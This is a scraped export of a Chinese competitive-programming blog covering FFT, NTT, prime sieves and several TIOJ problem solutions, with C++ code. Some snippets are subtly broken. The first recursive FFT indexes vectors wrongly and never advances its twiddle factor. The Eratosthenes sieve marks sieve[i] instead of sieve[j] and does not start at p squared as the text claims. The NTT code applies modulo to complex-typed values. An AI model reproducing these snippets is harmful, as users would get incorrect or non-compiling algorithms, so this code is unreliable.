A(x)B(x)\n$$\n除了上述利用分配律乘開以外\n因為$C$的次數已經可以確定\n我們也可以在$A(x)$和$B(x)$找出$n$個相異的點，相乘之後再利用插值法代入得到$C$\n其中$n = \\deg C + 1$\n也就是\n$$\n\\begin{bmatrix}\n1 \u0026amp; x_0 \u0026amp; x_0^2 \u0026amp; \\cdots \u0026amp; x_0^{n-1}\\newline\n1 \u0026amp; x_1 \u0026amp; x_1^2 \u0026amp; \\cdots \u0026amp; x_1^{n-1}\\newline\n\\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\newline\n1 \u0026amp; x _ {n-1} \u0026amp; x _ {n-1}^2 \u0026amp; \\cdots \u0026amp; x _ {n-1}^{n-1}\n\\end{bmatrix}\n\\begin{bmatrix}\na_0\\newline a_1\\newline \\vdots\\newline a _ {n-1}\n\\end{bmatrix} =\n\\begin{bmatrix}\nA(x_0)\\newline A(x_1)\\newline \\vdots\\newline A(x _ {n-1})\n\\end{bmatrix}\n$$\n$$\n\\begin{bmatrix}\n1 \u0026amp; x_0 \u0026amp; x_0^2 \u0026amp; \\cdots \u0026amp; x_0^{n-1}\\newline\n1 \u0026amp; x_1 \u0026amp; x_1^2 \u0026amp; \\cdots \u0026amp; x_1^{n-1}\\newline\n\\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\newline\n1 \u0026amp; x _ {n-1} \u0026amp; x _ {n-1}^2 \u0026amp; \\cdots \u0026amp; x _ {n-1}^{n-1}\n\\end{bmatrix}\n\\begin{bmatrix}\nb_0\\newline b_1\\newline \\vdots\\newline b _ {n-1}\n\\end{bmatrix} =\n\\begin{bmatrix}\nB(x_0)\\newline B(x_1)\\newline \\vdots\\newline B(x _ {n-1})\n\\end{bmatrix}\n$$\n$$\n\\begin{bmatrix}\n1 \u0026amp; x_0 \u0026amp; x_0^2 \u0026amp; \\cdots \u0026amp; x_0^{n-1}\\newline\n1 \u0026amp; x_1 \u0026amp; x_1^2 \u0026amp; \\cdots \u0026amp; x_1^{n-1}\\newline\n\\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\newline\n1 \u0026amp; x _ {n-1} \u0026amp; x _ {n-1}^2 \u0026amp; \\cdots \u0026amp; x _ {n-1}^{n-1}\n\\end{bmatrix}\n^{-1}\n\\begin{bmatrix}\nA(x_0)B(x_0)\\newline A(x_1)B(x_1)\\newline \\vdots\\newline A(x _ {n-1})B(x _ {n-1})\n\\end{bmatrix} =\n\\begin{bmatrix}\nc_0\\newline c_1\\newline \\vdots\\newline c _ {n-1}\n\\end{bmatrix}\n$$\n最後一步直接高斯消去或用拉格朗日/牛頓插值法可以做到$\\mathcal{O}(n^2)$\n上述步驟稱為DFT(對序列的版本叫離散傅立葉變換，與使用積分的連續傅立葉變換相對)和IDFT\n但是這樣根本沒有改進多少複雜度啊？\n邁向快速傅立葉變換的鑰匙是利用複數，取特定的某些$x$讓我們能夠分治\nRoot of Unity 首先先來介紹單位根$\\omega$是使得\n$$\n\\omega ^ n = 1\\newline\n\\forall 0 \\leq i \u0026lt; j \u0026lt; n, \\omega^i \\neq \\omega^j\n$$\n的數\n複習一下歐拉公式$$e^{ix} = \\cos x + i\\sin x$$\n習慣上可以取$\\omega_n = e^{-\\frac{2\\pi i}{n}}$(下標是表示$n$是最小的$i$使$\\omega^i = 1$，或者說$\\operatorname{ord}(\\omega_n) = n$)\n推薦觀賞3B1B系列\nhttps://youtu.be/v0YEaeIClKY\nhttps://youtu.be/mvmuCPvRoWQ\n引理們 Lemma a. $$\n\\omega _ {dn}^{dk} = (e^{\\frac{2\\pi i}{dn}})^{dk} = (e^{\\frac{2\\pi i}{n}})^k = \\omega_n^k\n$$\nLemma b. $$\n\\omega_n^{\\frac{n}{2}} = \\omega_2 = e^{i\\pi} = -1\n$$\nCooley-Tukey FFT algorithm 先假設$n$是2的冪次，然後下面提到的$i$都只是index\n將DFT中的$x_i$取值為$\\omega_n^i$，可以知道我們要算的就是對$i \\in [0, n-1]$求\n$$\ny_i = \\sum _ {j=0}^{n-1} a_j (\\omega_n^i)^j\n$$\n把右式的奇數項和偶數項分開處理(這邊是原理的精華)\n$$\n\\begin{align}\ny_i = \\sum _ {j=0}^{n-1} a_j (\\omega_n^i)^j\n\u0026amp;= \\sum _ {j=0}^{\\frac{n}{2}-1} a _ {2j} (\\omega_n^i)^{2j} + \\sum _ {j=0}^{\\frac{n}{2}-1} a _ {2j+1} (\\omega_n^i)^{2j+1}\\newline\n\u0026amp;= \\sum _ {j=0}^{\\frac{n}{2}-1} a _ {2j} (\\omega _ {\\frac{n}{2}}^i)^j + \\omega_n^i \\sum _ {j=0}^{\\frac{n}{2}-1} a _ {2j+1} (\\omega _ {\\frac{n}{2}}^i)^j\\newline\n\u0026amp;= F _ {even}(i) + \\omega_n^i F _ {odd}(i)\n\\end{align}\n$$\n其中$F _ {even}, F _ {odd}$分別是以奇數和偶數項FFT得到的東西，可以遞迴求解\n雖然以$\\frac{n}{2}$的長度遞迴只能得到$i \\in [0, \\frac{n}{2}-1]$的答案\n不過$F _ {even}$和$F _ {odd}$都有週期$\\frac{n}{2}$，再由Lemma b.可以簡化成\n$$\n\\text{for } 0 \\leq i \u0026lt; \\frac{n}{2},\n\\left\\{\\begin{matrix}\ny _ i \u0026amp;= F _ {even}(i) + \\omega_n^i F _ {odd}(i) \\newline\ny _ {i+\\frac{n}{2}} \u0026amp;= F _ {even}(i) - \\omega_n^i F _ {odd}(i)\n\\end{matrix}\\right.\n$$\n時間複雜度有$T(n) = 2T(n/2) + \\mathcal{O}(n)$，由主定理可知$T(n) = \\mathcal{O}(n\\log n)$\n要將FFT一言以概之，大概就是利用分治法將多項式轉換成點值表示吧\n附上遞迴版的參考程式碼，雖然迭代版通常效率較好不過遞迴版有助於理解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const double PI = acos(-1); typedef complex\u0026lt;double\u0026gt; cd; vector\u0026lt;cd\u0026gt; FFT(const vector\u0026lt;cd\u0026gt; \u0026amp;F) { // assume F.size() == 2^k if(F.size() == 1) return F; // base case (important) vector\u0026lt;cd\u0026gt; rec[2], ans; for(int i = 0; i \u0026lt; F.size(); i++) rec[i\u0026amp;1].push_back(F[i]); rec[0] = FFT(rec[0]); rec[1] = FFT(rec[1]); double theta = -2*PI / F.size(); cd now = 1, omega(cos(theta), sin(theta)); ans.resize(F.size()); for(int i = 0; i \u0026lt; F.size()/2; i++) { ans[i] = rec[0] + now * rec[1]; ans[i+F.size()/2] = rec[0] - now * rec[1]; } return ans; } Inverse-FFT 那麼要怎麼做IFFT(傅立葉變換的逆變換)，也就是把點值表示轉換回係數呢？\nFFT可以寫成矩陣的形式，也就是\n$$\n\\begin{bmatrix}\n1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1\\newline\n1 \u0026amp; \\omega \u0026amp; \\omega^2 \u0026amp; \\cdots \u0026amp; \\omega^{n-1}\\newline\n\\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\newline\n1 \u0026amp; \\omega^{n-1} \u0026amp; (\\omega^{n-1})^2 \u0026amp; \\cdots \u0026amp; (\\omega^{n-1})^{n-1}\n\\end{bmatrix}\n\\begin{bmatrix}\nc_0\\newline c_1\\newline \\vdots\\newline c _ {n-1}\n\\end{bmatrix} =\n\\begin{bmatrix}\nC(1)\\newline C(\\omega)\\newline \\vdots\\newline C(\\omega^{n-1})\n\\end{bmatrix}\n$$\n左項有一個范德蒙矩陣$V = [\\omega^{ij}]$ (0-base)\n事實上其反矩陣就是$V\u0026rsquo; = [\\frac{1}{n}\\omega^{-ij}]$\n說明:\n$$\n[V * V\u0026rsquo;] _ {i,j} = \\sum _ {k=0}^{n-1} V _ {i,k} V\u0026rsquo; _ {k,j} = \\frac{1}{n}\\sum _ {k=0}^{n-1} \\omega^{k(i-j)}\n$$\n$i=j$時顯然為1\n當$i \\neq j$利用等比級數公式可以知道總和為$0$\n故相乘的結果是單位矩陣\n可以發現我們只需要把FFT的$\\omega$改成倒數，最後再除上$n$就是IFFT所需要的\n因為FFT和IFFT的相似性，我們可以將程式碼整合如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const double PI = acos(-1); typedef complex\u0026lt;double\u0026gt; cd; vector\u0026lt;cd\u0026gt; FFT(const vector\u0026lt;cd\u0026gt; \u0026amp;F, bool inv) { // assume F.size() == 2^k if(F.size() == 1) return F; // base case (important) vector\u0026lt;cd\u0026gt; rec[2]; for(int i = 0; i \u0026lt; F.size(); i++) rec[i\u0026amp;1].push_back(F[i]); rec[0] = FFT(rec[0],inv); rec[1] = FFT(rec[1],inv); double theta = (inv ? 1 : -1) * 2 * PI / F.size(); cd now = 1, omega(cos(theta), sin(theta)); vector\u0026lt;cd\u0026gt; ans(F.size()); for(int i = 0; i \u0026lt; F.size()/2; i++) { ans[i] = rec[0][i] + now * rec[1][i]; ans[i+F.size()/2] = rec[0][i] - now * rec[1][i]; now *= omega; } if(inv) for(int i = 0; i \u0026lt; ans.size(); i++) ans[i] /= 2; return ans; } Convolution 有了FFT和IFFT兩個工具，我們要做捲積就很簡單了\n確定兩個多項式相乘的次數，並且選擇一個足夠大的$n = 2^k$(後面可以補0) 利用Cooley-Tukey演算法求出$A,B$的傅立葉變換$\\hat A, \\hat B$ 將$\\hat A, \\hat B$在對應位置兩兩相乘得到$\\hat C$(可能叫Hadamard Product吧) 再利用Cooley-Tukey演算法求出$C$ 1 2 3 4 5 6 7 8 9 10 11 12 13 vector\u0026lt;cd\u0026gt; A{1,3,4}; vector\u0026lt;cd\u0026gt; B{1,2,5}; signed main() { int n = 1\u0026lt;\u0026lt;__lg(A.size()+B.size())+1; A.resize(n); B.resize(n); A = FFT(A,0); B = FFT(B,0); vector\u0026lt;cd\u0026gt; C(n); for(int i = 0; i \u0026lt; n; i++) C[i] = A[i]*B[i]; C = FFT(C,1); for(int i = 0; i \u0026lt; n; i++) cout \u0026lt;\u0026lt; C[i].real() \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i==n-1]; } Iterative Version 迭代的版本不但簡單執行時間又快，值得記一下\n觀察遞迴的情況\n可以看到我們每次都是將一個序列的偶數項放前面做，奇數項放後面做再合併\n這可以想成將最低位的0/1移到最高位，例如\n$$\n100010\\textbf{1} \\rightarrow \\textbf{1}100010\\newline\n111110\\textbf{1} \\rightarrow \\textbf{1}111110\\newline\n101010\\textbf{0} \\rightarrow \\textbf{0}101010\n$$\n重複執行了把最低位移到最高位的動作$k = \\log_2{n}$次之後\n原本放在$i$的位置的數字的index最後會被放到$j$的地方，其中$j$是$i$在$k$位二進位數的反轉\n也就是說我們可以一開始就把所有數字放到他在遞迴樹中對應的位置，再一層一層往上合併\n那要拿哪些合併呢？其實每個相鄰的兩塊的相同位置對應的就是$F _ {even}$和$F _ {odd}$，組合算出$y_i$之後要填的地方也是那兩格\n剩下的就是看code理解了吧\u0026hellip;OwO?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 typedef complex\u0026lt;double\u0026gt; cd; void FFT(cd F[], int n, bool inv) { // in-place FFT, also assume n = 2^k for(int i = 0, j = 0; i \u0026lt; n; i++) { if(i \u0026lt; j) swap(F[i], F[j]); // magic! (maintain j to be the bit reverse of i) for(int k = n\u0026gt;\u0026gt;1; (j^=k) \u0026lt; k; k\u0026gt;\u0026gt;=1); } for(int step = 1; step \u0026lt; n; step \u0026lt;\u0026lt;= 1) { double theta = (inv ? 1 : -1) * PI / step; cd omega(cos(theta), sin(theta)); for(int i = 0; i \u0026lt; n; i += step*2) { cd now(1,0); for(int j = 0; j \u0026lt; step; j++) { cd a = F[i+j]; cd b = F[i+j+step] * now; F[i+j] = a+b; F[i+j+step] = a-b; now *= omega; } } } if(inv) for(int i = 0; i \u0026lt; n; i++) F[i] /= n; } NTT 注意到我們可以實行分治的關鍵就是存在一個$\\omega$使得\n$$\n\\omega ^ n = 1 \\wedge\n\\forall 0 \\leq i \u0026lt; j \u0026lt; n, \\omega^i \\neq \\omega^j\n$$\n現在我們想要在模一個質數$p$下做類似的事\n費馬小定理表明\n$$\n\\forall (a,p) = 1, a^{\\varphi(p)} \\equiv 1 \\pmod p\n$$\n如果有原根$g$使得\n$$\n\\forall 0 \\leq i \u0026lt; j \u0026lt; \\varphi(p), g^i \\not \\equiv g^j \\pmod p\n$$\n那麼$\\omega$的選擇就很簡單了，也就是$\\omega_n \\equiv g ^ {\\frac{\\varphi(p)}{n}}$\n容易驗證$\\omega_n$滿足上面的性質\n這樣做必須滿足$n | \\varphi(p)$，而若使用Cooley-Tukey演算法的話$n$會是2的冪次\n也就是說若$\\varphi(p) = p-1 = t \\cdot 2^k$，其中$t$是奇數\n那對這個$p$來說可行的$n$的範圍最多就是$2^k$了\n這也是為什麼NTT的模數常常都是那些數字的原因\n因為$p-1$必須在二進位下有很多個後綴0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 const int64_t MOD = 998244353, G = 3; int64_t modpow(int64_t e, int64_t p, int64_t m) { int64_t r = 1; for(; p; p\u0026gt;\u0026gt;=1) { if(p\u0026amp;1) r = r*e%m; e = e*e%m; } return r; } void NTT(int64_t F[], int n, bool inv) { // assume n = 2^k! for(int i = 0, j = 0; i \u0026lt; n; i++) { if(i \u0026lt; j) swap(F[i], F[j]); for(int k = n\u0026gt;\u0026gt;1; (j^=k) \u0026lt; k; k\u0026gt;\u0026gt;=1); } for(int step = 1; step \u0026lt; n; step \u0026lt;\u0026lt;= 1) { //may preprocess to boost int64_t omega = modpow(G, (MOD-1) / (step*2), MOD); if(inv) omega = modpow(omega, MOD-2, MOD); for(int i = 0; i \u0026lt; n; i += step*2) { int64_t now = 1; for(int j = 0; j \u0026lt; step; j++) { cd a = F[i+j]; cd b = F[i+j+step] * now % MOD; // reduce the use of % operator F[i+j] = (a+b \u0026lt; MOD ? a+b : a+b-MOD); F[i+j+step] = (a-b\u0026lt;0 ? a-b+MOD : a-b); now = now*omega%MOD; } } } if(inv) { int64_t invn = modpow(n, MOD-2, MOD); for(int i = 0; i \u0026lt; n; i++) F[i] = F[i]*invn%MOD; } } →NTT模數表←\n中國剩餘? 一個模數合不合適取決於最後答案的大小\n兩個值域$c$、長度$n$的多項式相乘，得出來的乘積的值域最多會是$nc^2$\n如果不會超過模數的話就可以直接使用\n但如果會超過怎麼辦？\n挑選更大的模數沒什麼用，因為相乘起來可能就超過long long了\n這時我們就必須做多次NTT再用中國剩餘定理合併\n如果真實的答案不是指數或階乘那種直接爆炸的數值\n甚至還可以用來對任意數字取模(?)\nEnd FFT與NTT的利用其實滿少的，大部分不是大數乘法就是生成函數，以後有時間再放一篇講好了\n","permalink":"https://omeletwithoutegg.github.io/2019/12/25/FFT-NTT/","tags":["tutorial","FFT"],"title":"FFT-NTT"},{"contents":"!待補QQ\n質數篩與快樂的積性函數 想必大家都精通各種質數篩法，最簡單的$\\mathcal{O}(n\\sqrt{n})$就不提啦\n$n\\log n$篩 1 2 3 4 5 for(int i = 2; i \u0026lt;= n; i++) { for(int j = i*2; j \u0026lt;= n; j+=i) { sieve[j] = 1; } } $\\sum \\frac{1}{i}$的調和級數是$\\mathcal{O}(\\log n)$量級的，故複雜度為$\\mathcal{O}(n\\log n)$\n這個寫法也可以很簡單的統計每個數字的因數個數\n1 for(int i = 1; i \u0026lt;= n; i++) for(int j = i; j \u0026lt;= n; j+=i) ++d[j]; 其中 d[i] 代表 i 的因數個數\n容易發現$\\sum\\limits _ {i=1}^n d[i]$也是$\\mathcal{O}(n\\log n)$量級的\n埃式篩 1 2 3 4 5 for(int i = 2; i \u0026lt;= n; i++) if(!sieve[i] \u0026amp;\u0026amp; 1LL*i*i \u0026lt;= n) { for(int j = i*2; j \u0026lt;= n; j += i) { sieve[i] = 1; } } 所有質數的倒數和是$\\mathcal{O}(\\log\\log n)$，因此複雜度是$\\mathcal{O}(n\\log\\log n)$，而且常數頗小\n另外對所有是合數的$n$來說，$n$的最小質因數$p$都不大於$\\sqrt{n}$，因此只要從$p^2$開始篩就能保證所有合數被篩到\n線性篩 線性篩的想法是想辦法讓範圍內的合數都只被其最小質因數篩到恰好一次\n1 2 3 4 5 6 7 8 9 vector\u0026lt;int\u0026gt; primes; for(int i = 2; i \u0026lt;= n; i++) { if(!sieve[i]) primes.push_back(i); for(long long p: primes) { if(i*p \u0026gt; n) break; sieve[i*p] = 1; if(i%p == 0) break; } } 若$i \\cdot p$的最小質因數不是$p$而是$q$，則$q | i$，由code可以發現一定在更之前的迴圈就跳出了\n故這樣複雜度能夠保證是$\\mathcal{O}(n)$\n積性函數 !待補QQ\n","permalink":"https://omeletwithoutegg.github.io/2019/12/24/Sieving-Method/","tags":["WIP"],"title":"Sieving-Method"},{"contents":"Dice Wars https://tioj.ck.tp.edu.tw/problems/1726\nDescription Dice Wars是一款兼具謀略和運氣的遊戲。\n遊戲中你扮演紫色的骰子，要攻下其他顏色的骰子的城池，進而統一全地圖。\n如今你選到了一張看起來不錯的地圖: 整張地圖呈一條直線，每個位置都有一個顏色勢力佔領。\n由於每次移動到相鄰異色的城池都必須經歷一場鏖戰，你想先經過程式計算後再進行遊戲。\n你想要每次詢問一個顏色對$(S, T)$，問從任何一個$S$的城池到任一個$T$的城池至少要經過幾場戰鬥。\n如果$S$或$T$已經滅亡(地圖中沒有任何一個該勢力)，就輸出$-1$。\nSolution 題敘裡面附上的遊戲好好玩www\n題目要問的其實就是$\\min\\limits _ {c_i=S,c_j=T}(|i-j|)$\n可以想到對每種顏色開一個 vector 紀錄他們的index\n一種naive$\\mathcal{O}(nq)$的方法是每次詢問都直接把兩種顏色的兩個 vector merge $\\mathcal{O}(n)$合併並計算答案\n而另一種naive的算法則是先針對每一種顏色$\\mathcal{O}(n)$預處理其對其他顏色的答案，複雜度$\\mathcal{O}(n^2+q)$\n前者拉低複雜度的關鍵是某種顏色出現很多次\n而後者則是會因為太多種顏色而複雜度爛掉\n怎麼辦呢？可以不要全部預處理，只針對出現次數超過$k$的顏色做預處理，這些顏色的種類數不會超過$\\frac{n}{k}$種\n故預處理需要$\\mathcal{O}(\\frac{n^2}{k})$\n而對於詢問的兩個顏色的出現次數都沒有超過$k$的情況，可以直接用上面第一個算法處理\n複雜度$\\mathcal{O}(qk)$\n根據算幾不等式可取$k=\\frac{n}{\\sqrt{q}}$有複雜度$\\mathcal{O}(n\\sqrt{q})$\n註: 這題我寫的時候 ans 開原生陣列MLE，不知為何用vector陣列會是好的\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local #define pb emplace_back using namespace std; constexpr int N = 60025, K = 300, inf = 1e8; vector\u0026lt;int\u0026gt; id[N],ans[K]; int big[N],totb,n,q,v[N]; void precalc(int k) { ans[k].resize(n+1,inf); //for(int i = 1; i \u0026lt;= n; i++) ans[k][i] = inf; int last; last = -inf; for(int i = 0; i \u0026lt; n; i++) { if(big[v[i]] == k) last = i; else ans[k][v[i]] = min(ans[k][v[i]], i - last); } last = inf; for(int i = n-1; i \u0026gt;= 0; i--) { if(big[v[i]] == k) last = i; else ans[k][v[i]] = min(ans[k][v[i]], last - i); } } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); // small - small -\u0026gt; brute every time // big - other -\u0026gt; precalc cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; int S = 400; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; v[i]; for(int i = 0; i \u0026lt; n; i++) id[v[i]].pb(i); for(int i = 1; i \u0026lt;= n; i++) if(id[i].size() \u0026gt;= S) { big[i] = ++totb; precalc(big[i]); } while(q--) { int a,b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; if(id[a].empty() || id[b].empty()) cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else if(a == b) cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else { if(id[a].size() \u0026lt; S \u0026amp;\u0026amp; id[b].size() \u0026lt; S) { vector\u0026lt;int\u0026gt; A = id[a]; vector\u0026lt;int\u0026gt; B = id[b]; int i = 0, j = 0, lastA = -inf, lastB = -inf, res = inf; while(i \u0026lt; A.size() || j \u0026lt; B.size()) { if(j==B.size() || (i\u0026lt;A.size() \u0026amp;\u0026amp; A[i]\u0026lt;B[j])) { int t = A[i++]; res = min(res, t - lastB); lastA = t; }else { int t = B[j++]; res = min(res, t - lastA); lastB = t; } } cout \u0026lt;\u0026lt; res \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; }else { if(big[a]) cout \u0026lt;\u0026lt; ans[big[a]][b] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else cout \u0026lt;\u0026lt; ans[big[b]][a] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/23/TIOJ-1726/","tags":["TIOJ","sqrt-decomposition"],"title":"TIOJ-1726"},{"contents":"新專輯 https://tioj.ck.tp.edu.tw/problems/1674\nDescription 最近你打算訂購$N^2$張水樹奈奈的專輯《極限魅惑IMPACT EXCITER》。\n由於份量實在是太多了，你決定分散成$N$份訂單。\n然而，不幸的，依據博客來新的訂貨規定，每一位顧客第$k$次下訂單所訂的CD張數必頇是$k$的正整數倍。\n換句話說，一位顧客第$5$次訂的CD張數只可能是$5$張、$10$張、$15$張、…依此類推。\n當然，原先你把$N^2$張CD分散在$N$份訂單的目的就是為了讓一張訂單中最多只會有$N$張CD。\n即使博客來多了這項奇怪的規定，你仍然不打算捨棄你的原則，只是這樣每份訂單訂的數量可能會達不到你原來的期望。\n無論如何，你還是下了訂單。為了估計你實際訂下的CD數與你期望訂下的CD數的差別，你決定把每次你少訂的數量加起來。\n可是，因為你可能少訂非常多張CD，所以你希望算出少訂的總數量除以$10^9+9$的餘數。\n也就是說，如果你總共要訂$3^2$張CD，分成三次訂的話，\n那你第一、第二、第三次分別可以訂$3$、$2$、$3$張CD，分別會少訂是$0＋1＋0＝1$張CD。\nSolution 仔細讀懂題目之後可以發現題目要求的就是\n$$\n\\sum _ {i=1}^n n\\%i\n$$\n不過$n$可以到$10^{13}$不能直接$\\mathcal{O}(n)$跑過去\n數論分塊 數論分塊的精神很簡單，不同的$\\lfloor n/i \\rfloor$數量只有$\\mathcal{O}(\\sqrt{n})$種\n說明:\n對於$i \\leq \\sqrt{n}$，最多只有$\\sqrt{n}$種不同的值\n對於$i \u0026gt; \\sqrt{n}$，$\\lfloor n/i \\rfloor \u0026lt; \\sqrt{n}$最多也只有$\\sqrt{n}$種不同的值\n怎麼快速枚舉可能的$\\lfloor n/i \\rfloor$？\n1 2 3 4 5 6 for(int i = 1,j,x; i \u0026lt;= n; i = j+1) { x = n/i; j = n/x; // j是最大的數字使得j*x \u0026lt;= n，意即[i,j]區間內正好是所有n/k=x的數字 // use n/i here } 回到剛剛的式子，把他改寫成\n$$\n\\sum _ {i=1}^n n - i \\cdot \\lfloor \\frac{n}{i} \\rfloor\n$$\n後面那項等價於算區間$\\sum _ {k=i}^j k \\cdot x$\n其中區間$[i,j]$是所有$\\lfloor n/k \\rfloor = x = \\lfloor n/i \\rfloor$的$k$\n小學數學算一算就可以知道這是$x \\cdot (\\frac{j(j+1)}{2} - \\frac{(i-1)i}{2})$的啦\n記得小心處理模$10^9+9$的部分，尤其因為$n$可以到$10^{13}$，兩個數字乘起來的時候都要先模一次\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; const ll MOD = 1000000009; ll modpow(ll e, ll p) { ll r = 1; while(p) (p\u0026amp;1)\u0026amp;\u0026amp;(r=r*e%MOD), e=e*e%MOD, p\u0026gt;\u0026gt;=1; return r; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); ll n,sum = 0; cin \u0026gt;\u0026gt; n; for(ll i = 1,j; i \u0026lt;= n; i = j+1) { j = n/(n/i); ll x = (n/i)%MOD; ll sr = (j%MOD)*((j+1)%MOD)%MOD; ll sl = (i%MOD)*((i-1)%MOD)%MOD; sum = (sum + x * (sr - sl + MOD))%MOD; } ll s = (n%MOD)*(n%MOD)%MOD; cout \u0026lt;\u0026lt; (s - sum * modpow(2, MOD-2) % MOD + MOD) % MOD \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/19/TIOJ-1674/","tags":["TIOJ","math"],"title":"TIOJ-1674"},{"contents":"通關密語 https://tioj.ck.tp.edu.tw/problems/1035\nDescription 給定兩個長度小於 $5 \\times 10^4$ 的小寫英文字母字串 $S,T$\n定義「最佳擬合」，就是將 $S$ 經過平移後和 $T$ 比對，同樣的字元數最多的那一種方法。\n請輸出一個正整數，代表最佳擬合的方案下，相同的字元有幾個。\nex.\n對於\nababa\nbabab\n來說，\nababa\n=babab\n這是一種最佳擬合的方法，$S$經過向左平移之後$S,T$有四個位置的字元相同\nSolution naive的$n^2$做法可以AC本題，只要妥當控制常數即可\n不過這裡提供一個NTT的$\\mathcal{O}(C\\cdot n\\log n)$解\n假設$S$對$T$的平移量是$x$(可以為負的)，題目所求為\n$$\n\\sum _ {i-j = x} [S_i = T_j]\n$$\n的最大值\n那我們枚舉26種英文字母，可以寫成\n$$\n\\sum _ {c \\in \\sigma} \\sum _ {i-j = x} [S_i = c] \\cdot [T_j = c]\n$$\n令$F_i = [S_i = c], G_j = [T _ {-j} = c]$\n答案便是\n$$\nR_x = \\sum _ {i+j = x} F_i G_j = F * G\n$$\n最後取$R$的最大值就好了，答案不會大於字串長度所以模數只要不要超小就不用關心答案被mod到\n每次捲積交給NTT可以$\\mathcal{O}(n\\log n)$做完\n索引值取負號可以用直接反轉字串取代，因為本題不關心偏移量$x$是多少\n另外這題用FFT好像比較快，模的常數真的有點大\n有一個常數優化是沒有出現過的字母就不需要NTT\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int64_t m = 998244353, g = 3, N = 1\u0026lt;\u0026lt;17; int rev[N]; int64_t modpow(int64_t e,int64_t p) { int64_t r = 1; while(p) (p\u0026amp;1)\u0026amp;\u0026amp;(r=r*e%m), e=e*e%m, p\u0026gt;\u0026gt;=1; return r; } void NTT(int64_t F[],int n,bool inv) { for(int i = 0, L = __lg(n); i \u0026lt; n; i++) { rev[i] = (rev[i\u0026gt;\u0026gt;1]\u0026gt;\u0026gt;1) | ((i\u0026amp;1)\u0026lt;\u0026lt;L-1); if(i \u0026lt; rev[i]) swap(F[i],F[rev[i]]); } for(int step = 1; step \u0026lt; n; step *= 2) { int64_t root = modpow(g,(m-1)/(step*2)); if(inv) root = modpow(root,m-2); for(int i = 0; i \u0026lt; n; i += step*2) { int64_t now = 1; for(int j = 0; j \u0026lt; step; j++) { int64_t a = F[i+j]; int64_t b = F[i+j+step]*now%m; F[i+j] = (a+b)%m; F[i+j+step] = (a-b+m)%m; now = now*root%m; } } } if(inv) { int64_t in = modpow(n,m-2); // inv of n for(int i = 0; i \u0026lt; n; i++) F[i] = F[i]*in%m; } } void mul(int64_t A[],int64_t B[],int64_t C[],int n) { NTT(A,n,0); NTT(B,n,0); for(int i = 0; i \u0026lt; n; i++) C[i] = A[i]*B[i]%m; NTT(C,n,1); } int64_t A[N],B[N],C[N],ans[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); string s,t; cin \u0026gt;\u0026gt; s \u0026gt;\u0026gt; t; int n = 1\u0026lt;\u0026lt;__lg(s.size()+t.size())+1; for(int c = 0; c \u0026lt; 26; c++) { for(int i = 0; i \u0026lt; n; i++) { A[i] = (i \u0026lt; s.size() \u0026amp;\u0026amp; s[i]-\u0026#39;a\u0026#39;==c); B[i] = (i \u0026lt; t.size() \u0026amp;\u0026amp; t[t.size()-1-i]-\u0026#39;a\u0026#39;==c); } mul(A,B,C,n); for(int i = 0; i \u0026lt; n; i++) ans[i] += C[i]; } cout \u0026lt;\u0026lt; *max_element(ans,ans+n) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/18/TIOJ-1035/","tags":["TIOJ","FFT"],"title":"TIOJ-1035"},{"contents":"動態樹的奮鬥 為了這題的Link-Cut-Tree解我花了不只一整天XD\n壓常實在是神奇的事，把 long long 改成 int 再加上幾個 pragma 終於成功壓過唯一奇怪的那筆= =\n而且 push 竟然還不能用遞迴寫，到底三小\nLCT怎麼這麼可撥XD\n不過壓過去那筆之後其他筆的執行時間加起來超少，值得了\n註: 